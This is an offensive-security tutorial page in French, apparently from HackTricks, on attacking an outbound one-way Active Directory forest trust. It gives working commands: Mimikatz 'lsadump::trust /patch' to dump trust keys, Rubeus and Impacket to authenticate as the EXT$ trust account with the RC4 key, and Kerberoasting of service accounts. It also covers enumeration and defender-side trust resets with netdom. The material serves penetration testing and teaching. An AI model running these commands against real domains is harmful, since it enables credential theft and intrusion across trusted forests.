# Domaine de forêt externe - Unidirectionnel (sortant)

{{#include ../../banners/hacktricks-training.md}}

Dans ce scénario, **votre domaine** **accorde sa confiance** à certains **privilèges** à des principaux d’un **domaine/forêt différent**.

## Énumération

### Confiance sortante
```bash
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
Si vous avez le module AD disponible, inspectez également directement le **Trusted Domain Object (TDO)**. Cela vous donne les données de trust brutes, soutenues par LDAP, dont vous aurez plus tard besoin pour décider si la voie la plus simple est **FSP/group abuse** ou **trust-account abuse** :
```powershell
# Enumerate the TDO created for the foreign forest/domain
Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' -SearchBase "CN=System,$((Get-ADDomain).DistinguishedName)" -Properties trustDirection,trustType,trustAttributes,flatName,securityIdentifier,whenCreated,whenChanged |
Select Name,flatName,trustDirection,trustType,trustAttributes,securityIdentifier,whenCreated,whenChanged

# Fast trust hygiene check from the outbound side
Get-ADTrust -Identity ext.local -Properties ForestTransitive,SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation
```
Vous devriez également lister où les principaux étrangers de `CN=ForeignSecurityPrincipals` ont réellement obtenu des droits d’accès. Les cas courants sont :

- **Local admin** sur un server/DC dans votre domaine actuel
- Membership dans un **custom domain group** qui a des ACLs sur des users/computers/GPOs
- Rights to modify les **computer objects**, qui peuvent ensuite devenir [RBCD](resource-based-constrained-delegation.md) si la configuration du trust le permet

## Trust Account Attack

Lorsqu’un one-way trust est créé d’un domaine/forest **B** vers un domaine/forest **A** (**B trusts A**), un **trust account** pour **B** est créé dans **A**. Dans la vue outbound-trust de **A**, c’est utile car si vous compromettez ensuite **B** (le côté trusting), vous pouvez y dumper le trust secret et vous authentifier de nouveau vers **A** en tant que `B$`.

L’aspect critique à comprendre ici est que le password et le Kerberos material de ce trust account peuvent être extraits depuis un Domain Controller du domaine **trusting** en utilisant :
```bash
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Cela fonctionne parce que le compte de trust créé dans le domaine **trusted** est un principal activé qui se retrouve avec les droits de base d’un utilisateur normal du domaine. C’est souvent suffisant pour commencer à énumérer LDAP, demander des tickets, et trouver le prochain chemin d’escalade.

Dans un scénario où `ext.local` est le domaine **trusting** et `root.local` est le domaine **trusted**, un compte utilisateur nommé `EXT$` est créé à l’intérieur de `root.local`. Le dump des trust keys depuis `ext.local` révèle des identifiants qui peuvent être utilisés comme `root.local\EXT$` contre `root.local`:
```bash
lsadump::trust /patch
```
En suivant cela, utilisez la clé **RC4** extraite pour vous authentifier en tant que `root.local\EXT$` dans `root.local`:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Puis énumérez le domaine de confiance en tant que principal, par exemple en effectuant un Kerberoasting sur un SPN à haute valeur dans `root.local` :
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Depuis Linux

Si vous avez récupéré la clé de compte de confiance **RC4**, la même idée fonctionne depuis Linux avec Impacket :
```bash
python getTGT.py -dc-ip dc.root.local root.local/EXT\$ -hashes :<RC4>
export KRB5CCNAME=EXT\$.ccache

# Kerberoast from the trusted domain as the trust account
GetUserSPNs.py -request -k -no-pass -dc-ip dc.root.local root.local/EXT\$ -outputfile root_spns.kerberoast

# Or reduce noise and request only one user
GetUserSPNs.py -request-user svc_sql -k -no-pass -dc-ip dc.root.local root.local/EXT\$
```
Si **RC4** n’est pas accepté, basculez vers le **cleartext password** récupéré (ou les clés **AES** dérivées) et réutilisez les workflows habituels [Over-Pass-the-Hash / Pass-the-Key](over-pass-the-hash-pass-the-key.md) et [Kerberoast](kerberoast.md) depuis ce point d’appui.

### Key material gotchas

Ne mélangez pas les **trust keys** et les **trust-account credentials** :

- Dans un trust one-way, les deux côtés stockent un **TDO**, mais le véritable compte utilisateur **`EXT$` n’existe que dans le domaine trusted**.
- Le mot de passe actuel du trust-account est reflété dans le secret de trust du TDO (`NewPassword` / current trust key).
- La **RC4** trust key est l’artefact le plus simple à réutiliser pour `asktgt` en tant que trust account ; dans les configurations par défaut, c’est généralement l’enctype fonctionnel car le trust account a souvent un `msDS-SupportedEncryptionTypes` vide.
- Si vous pensez en termes de **AES trust keys**, rappelez-vous qu’elles ne sont pas interchangeables avec les trust-account AES keys, car les salts diffèrent.

Donc, pour la technique de cette page, privilégiez soit le matériel **RC4** dumpé, soit le **cleartext** password récupéré.

### Gathering cleartext trust password

Dans le flux précédent, il a été utilisé le trust hash au lieu du **cleartext password** (qui est aussi **dumped by mimikatz**).

Le cleartext password peut être obtenu en convertissant la sortie \[ CLEAR ] de mimikatz depuis l’hexadécimal et en supprimant les octets nuls `\x00` :

![Trust Account Attack - Gathering cleartext trust password: The cleartext password can be obtained by converting the ( CLEAR ) output from mimikatz from hexadecimal and removing null...](<../../images/image (938).png>)

Parfois, lors de la création d’une trust relationship, un mot de passe doit être saisi par l’utilisateur pour le trust. Dans cette démonstration, la key est le mot de passe de trust d’origine et donc lisible par un humain. À mesure que la key tourne (par défaut : tous les 30 jours), le cleartext cesse généralement d’être lisible par un humain mais reste techniquement utilisable.

Le cleartext password peut être utilisé pour effectuer une authentification normale en tant que trust account, comme alternative à la demande d’un TGT avec la Kerberos secret key du trust account. Ici, interrogation de `root.local` depuis `ext.local` pour les membres de `Domain Admins` :

![Trust Account Attack - Gathering cleartext trust password: The cleartext password can be used to perform regular authentication as the trust account, an alternative to requesting a TGT...](<../../images/image (792).png>)

### Practical limitations

> [!WARNING]
> Les trust accounts sont des principals délicats. Les interactive logons comme **RUNAS / console / RDP** ne sont pas le chemin attendu ici, et les tentatives d’authentification **NTLM** peuvent échouer avec `STATUS_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT`. Préparez-vous plutôt à des **Kerberos network logons** (`asktgt`, LDAP, CIFS, Kerberoast).

### Persistence / cleanup note

Si les défenseurs réalisent que le domaine trusted a été compromis, ils doivent faire tourner le trust secret des **deux côtés** avec `netdom trust ... /resetOneSide ...`. Du point de vue de l’opérateur, c’est important car un **reset manuel invalide immédiatement l’ancien matériel de trust**, alors qu’une rotation normale du mot de passe de trust conserve les valeurs actuelles/précédentes pendant le rollover.
```bash
# Run once from the trusted side
netdom trust root.local /domain:ext.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*

# Run once from the trusting side
netdom trust ext.local /domain:root.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*
```
## Références

- [https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust)

{{#include ../../banners/hacktricks-training.md}}
